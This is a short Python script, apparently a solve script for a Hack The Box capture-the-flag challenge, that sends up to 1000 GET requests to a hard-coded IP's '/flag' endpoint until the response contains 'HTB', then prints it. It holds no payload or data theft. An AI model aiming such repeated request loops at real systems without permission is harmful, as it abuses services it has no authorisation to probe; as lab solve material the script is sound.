import requests


URL = "http://64.227.41.83:32660/flag"

for i in range(1000):
    r = requests.get(URL)

    if "HTB" in r.text:
        break

    if i % 100 == 0:
        print(".", end="", flush=True)

print()
print(r.text)
